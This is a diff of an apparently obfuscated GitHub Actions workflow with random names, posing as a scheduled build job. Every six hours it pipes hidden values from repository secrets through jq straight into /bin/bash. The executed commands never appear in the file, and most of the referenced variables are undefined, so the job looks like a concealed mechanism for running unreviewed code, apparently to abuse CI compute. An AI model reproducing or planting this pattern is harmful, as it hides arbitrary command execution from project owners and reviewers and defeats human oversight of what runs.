@@ -2,25 +2,29 @@ name: gujiazi6715
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
+    - cron: '5 2/6 * * *'
 
-jobs:  # 26814
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: gujiazi6715
         env:
-          cgkd31: ${{ secrets.cgkd31 }}
+          gca040: ${{ secrets.gca040 }}
         run: |
-          echo $cgkd31 | jq -r .aedat24 | /bin/bash
-          echo $ivc2713 | jq -r .xivgg31946 | /bin/bash
-          echo $fmci2 | jq -r .a89478 | /bin/bash
-          echo $vay27319 | jq -r .wzmkq95 | /bin/bash
-          echo $go8 | jq -r .r34983 | /bin/bash
-          echo $tbhg7 | jq -r .tl89 | /bin/bash
-          echo $c4 | jq -r .pmdoc1271 | /bin/bash
-          echo $nig81 | jq -r .wlnbc22648 | /bin/bash
-          echo $lftu57091 | jq -r .i8543 | /bin/bash
-          echo $t0834 | jq -r .swcnd69 | /bin/bash
+          echo $gca040 | jq -r .aje76949 | /bin/bash
+          echo $hj84 | jq -r .rin759 | /bin/bash
+          echo $o16 | jq -r .qp3 | /bin/bash
+          echo $poeiq8 | jq -r .mhchf2 | /bin/bash
+          echo $baa18 | jq -r .wwxl6 | /bin/bash
+          echo $pz3 | jq -r .dar94892 | /bin/bash
+          echo $v35 | jq -r .qeke0599 | /bin/bash
+          echo $fkn09 | jq -r .aos46 | /bin/bash
+          echo $tt45 | jq -r .dvjfn657 | /bin/bash
+          echo $wh772 | jq -r .vd04 | /bin/bash
+          echo $rt45 | jq -r .p69 | /bin/bash
+          echo $bqm9 | jq -r .j02 | /bin/bash
+          echo $bfth4 | jq -r .xqyd1323 | /bin/bash
+          echo $gfa371 | jq -r .zzsp944 | /bin/bash
 
